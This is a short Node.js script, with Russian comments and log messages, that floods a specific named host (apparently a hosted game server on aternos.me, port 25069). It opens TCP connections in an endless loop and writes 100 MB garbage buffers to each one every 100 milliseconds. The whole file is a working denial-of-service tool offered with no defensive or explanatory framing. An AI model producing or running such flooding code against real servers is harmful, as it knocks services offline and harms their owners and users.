import net from 'net';

function floodServer() {
    const socket = net.connect(25069, 'vladlohh3.aternos.me');
    
    socket.on('connect', () => {
        console.log('Подключен для флуда');
        
        // Отправляем огромные пакеты постоянно
        const floodInterval = setInterval(() => {
            const garbage = Buffer.alloc(100 * 1024 * 1024); // 100MB
            socket.write(garbage);
            console.log('Флуд пакет отправлен');
        }, 100);
        
        socket.on('error', () => {
            clearInterval(floodInterval);
        });
        
        socket.on('close', () => {
            clearInterval(floodInterval);
            console.log('Соединение разорвано');
        });
    });
}

for (;;) {
    floodServer()
}